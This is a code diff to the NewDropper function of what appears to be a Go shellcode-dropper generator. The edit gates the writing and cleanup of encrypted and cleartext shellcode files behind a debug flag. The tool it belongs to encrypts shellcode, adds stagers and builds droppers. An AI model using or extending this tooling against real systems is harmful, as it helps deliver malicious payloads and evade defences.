@@ -29,15 +29,19 @@ func NewDropper(goDrop Dropper, dropname, domain, input, output, url, img, host,
 
 		}
 	*/
+	//Set Debug mode.
+	Debug = goDrop.Debug
 
 	goDrop.LeetImp = " "
 	goDrop.BlockNonMs = " "
 	goDrop.MemCom = MemCom
 
 	var shellcode dropfmt.DropFmt
-
-	if goDrop.Arch {
-		color.Yellow("[gengo]Arch set to x86, please note this is not supported for all droppers.")
+	if Debug {
+		color.Yellow("[gengo] Debug enabled, gengo will save files related to compilation.")
+		if goDrop.Arch {
+			color.Yellow("[gengo]Arch set to x86, please note this is not supported for all droppers.")
+		}
 	}
 
 	// if input is CALC, use inbuilt CALC shellcode.
@@ -62,25 +66,28 @@ func NewDropper(goDrop Dropper, dropname, domain, input, output, url, img, host,
 	//Prep shellcode.
 	goDrop.BufStr = `"` + shellcode.ToB64() + `"`
 	goDrop.KeyStr = `"` + shellcode.KeyB64() + `"`
-	scFilepath := filepath.Join(output, dropname+"_encryptedB64.txt")
-	//Write shellcode files in case they are needed later.
-	scFile, err := os.Create(scFilepath)
-	if err != nil {
-		log.Fatalf("Error creating shellcode file: %v ", err)
+	if Debug {
+		//Write shellcode files in case they are needed later.
+		scFilepath := filepath.Join(output, dropname+"_encryptedB64.txt")
+		scFile, err := os.Create(scFilepath)
+		if err != nil {
+			log.Fatalf("Error creating shellcode file: %v ", err)
+
+		}
+		scFile.WriteString("ShellcodeKey: " + goDrop.KeyStr + "\n")
+		scFile.WriteString("ShellcodeBuf:\n" + goDrop.BufStr)
+		scFile.Close()
+		binFilepath := filepath.Join(output, dropname+"_Clear.bin")
+		fmt.Println(binFilepath)
+		binFile, err := os.Create(binFilepath)
+		if err != nil {
+			log.Fatalf("Error creating shellcode file: %v ", err)
+
+		}
+		binFile.Write(shellcode.Buf)
+		binFile.Close()
 
 	}
-	scFile.WriteString("ShellcodeKey: " + goDrop.KeyStr + "\n")
-	scFile.WriteString("ShellcodeBuf:\n" + goDrop.BufStr)
-	scFile.Close()
-	binFilepath := filepath.Join(output, dropname+"_Clear.bin")
-	fmt.Println(binFilepath)
-	binFile, err := os.Create(binFilepath)
-	if err != nil {
-		log.Fatalf("Error creating shellcode file: %v ", err)
-
-	}
-	binFile.Write(shellcode.Buf)
-	binFile.Close()
 
 	//Add stager code if url is set.
 	if url != "" {
@@ -142,17 +149,9 @@ func NewDropper(goDrop Dropper, dropname, domain, input, output, url, img, host,
 		buildFileGo(output, dropfilename, goDrop.Shared, goDrop.Arch)
 	}
 
-	if !goDrop.Debug {
+	if !Debug {
 
 		err = os.Remove(dropfilename)
-		if err != nil {
-			log.Print(err)
-		}
-		err = os.Remove(binFilepath)
-		if err != nil {
-			log.Print(err)
-		}
-		err = os.Remove(scFilepath)
 		if err != nil {
 			log.Print(err)
 		}
